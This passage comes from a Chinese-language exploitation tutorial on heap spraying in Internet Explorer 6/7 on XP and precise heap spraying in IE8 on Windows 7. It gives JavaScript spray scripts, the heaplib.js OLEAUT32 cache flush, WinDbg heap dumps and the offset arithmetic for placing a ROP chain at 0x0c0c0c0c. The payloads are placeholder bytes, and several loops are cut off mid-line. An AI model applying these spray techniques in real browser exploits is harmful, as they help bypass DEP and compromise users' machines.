通过数组分配大量内存。  
**  
**
**XP下IE6和IE7的堆喷射**
为了运行多个版本的IE，可以使用IE Collection安装多个版本的IE，这里在XP SP3上安装了IE6和IE7用于测试。
IE6和IE7上稳定的堆喷脚本如下:
        var shellcode = unescape('%u4141%u4141');
        var bigblock = unescape('%u9090%u9090');
        var headsize = 20;
        var slackspace = headsize + shellcode.length;
        while (bigblock.length 
分配了500块大小为0x40000 * 2的内存块(.length返回大小为实际大小一半)，结果:
    0:009> dd 0c0c0c0c
    0c0c0c0c  90909090 90909090 90909090 90909090
    0c0c0c1c  90909090 90909090 90909090 90909090
    ...
可以尝试多次，发现都是成功的，查看堆的状态:
    0:009> !heap -stat -h 00140000
     heap @ 00140000
    group-by: TOTSIZE max-display: 20
        size     #blocks     total     ( %) (percent of total busy bytes)
        7ffe0 1f5 - fa7c160  (99.78)
        8000 1 - 8000  (0.01)
        7fe0 1 - 7fe0  (0.01)
    ...
基本上块的大小都是7ffe0，也就是我们分配的0x40000 * 2。  
**  
**
**Win7下的IE8的堆喷射**
对于IE8浏览器，之前的脚本不再适用，而且IE8一般都配合了DEP，所以不仅需要堆喷射，还需要精准的堆喷射，使得预测的地址正好在ROP链的起始，否则绕不过DEP的防护。
对于JavaScript申请字符串并不总是从系统堆中申请，通常是由OLEAUT32.DLL中的堆管理器来进行管理，其中维护了一张缓存表，每当一块内存被释放，堆管理器就会把指向那块内存的指针放到缓存表中，当下次再次分配内存时，管理器会优先把缓存表中合适的内存块返回给程序。
缓存表有四个bin，每个bin可以容纳6块已经被释放的内存块，每个bin可容纳块的大小不同，大于32767 bytes的块直接被释放，不会缓存:
    CacheEntry bin_1_32     [6];  // blocks from 1 to 32 bytes
    CacheEntry bin_33_64    [6];  // blocks from 33 to 64 bytes
    CacheEntry bin_65_256   [6];  // blocks from 65 to 265 bytes
    CacheEntry bin_257_32768[6];  // blocks from 257 to 32768 bytes
我们需要保证每次分配内存都由系统堆处理，而不是缓存，通过缓存申请的堆空间可能在堆里的任何地方，所以预测的地址会变得不可靠，由于每个bin只能容纳6块，Alexander
Sotirov提出了plunger技术，在堆喷前强制刷新所有缓存块，具体就是为每个bin申请其可容纳的最大堆块大小的内存，保证了所有缓存都是空的，接下来的分配都会由系统堆处理。  
为了实现精准的堆喷，在IE8下我使用了[heaplib.js](http://pwdme.cc/heaplib.js)这个JavaScript的堆管理库，Alexander
Sotirov在[Heap Feng Shui in
JavaScript](http://pwdme.cc/Heap_Feng_Shui_in_JavaScript.pdf)这篇文章中描述并实现了heaplib.js库。
heaplib中对于plunger的实现:
    heapLib.ie.prototype.flushOleaut32 = function() {
        this.debug("Flushing the OLEAUT32 cache");
        // Free the maximum size blocks and push out all smaller blocks
        this.freeOleaut32("oleaut32");
        // Allocate the maximum sized blocks again, emptying the cache
        for (var i = 0; i 
    var heap_obj = new heapLib.ie(0x10000);
    var code = unescape("%ucccc%ucccc");    //Code to execute
    var nops = unescape("%u9090%u9090");    //NOPs
    while (nops.length 
查看分配的内存:
    0:016> !heap -flt s 7ffc0
        _HEAP @ 140000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            037c0018 fff8 0000  [0b]   037c0020    7ffc0 - (busy VirtualAlloc)
            03850018 fff8 fff8  [0b]   03850020    7ffc0 - (busy VirtualAlloc)
            038e0018 fff8 fff8  [0b]   038e0020    7ffc0 - (busy VirtualAlloc)
            03970018 fff8 fff8  [0b]   03970020    7ffc0 - (busy VirtualAlloc)
            03a00018 fff8 fff8  [0b]   03a00020    7ffc0 - (busy VirtualAlloc)
            03a90018 fff8 fff8  [0b]   03a90020    7ffc0 - (busy VirtualAlloc)
            03b20018 fff8 fff8  [0b]   03b20020    7ffc0 - (busy VirtualAlloc)
            03bb0018 fff8 fff8  [0b]   03bb0020    7ffc0 - (busy VirtualAlloc)
    ...
    ...
            0bfe0018 fff8 fff8  [0b]   0bfe0020    7ffc0 - (busy VirtualAlloc)
            0c070018 fff8 fff8  [0b]   0c070020    7ffc0 - (busy VirtualAlloc)
            0c100018 fff8 fff8  [0b]   0c100020    7ffc0 - (busy VirtualAlloc)
    ...
    ...
    0:016> !heap -p -a 0c0c0c0c
        address 0c0c0c0c found in
        _HEAP @ 140000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0c070018 fff8 0000  [0b]   0c070020    7ffc0 - (busy VirtualAlloc)
可以发现地址都是以0x10000对齐的，这就为精准堆喷打下了基础，可以精确计算堆块中的位置，0x0c0c0c0c处于0x0c070018处的块中。  
查看一下0x0c0c0018处的内存:
    0:016> dd 0c0c0018
    0c0c0018  90909090 cccccccc 90909090 90909090
    0c0c0028  90909090 90909090 90909090 90909090
可以知道下一个块起始于0x0c0c0018+0x8，计算ROP起始偏移:
    0x0c0c0c0c - 0x0c0c0018 + 0x8 = 0xbec
    0xbec / 2 = 0x5f6
假设ROP链为AAAABBBBCCCCDDDD，shellcode为xccxccxccxcc，把脚本改为:
    var heap_obj = new heapLib.ie(0x10000);
    var code = unescape("%ucccc%ucccc");
    var rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444");
    var padding = unescape("%u9090%u9090");
    while (padding.length 
查看预测地址:
    0:019> dd 0c0c0c0c
    0c0c0c0c  41414141 42424242 43434343 44444444
    0c0c0c1c  cccccccc cccccccc cccccccc cccccccc
    0c0c0c2c  cccccccc cccccccc cccccccc cccccccc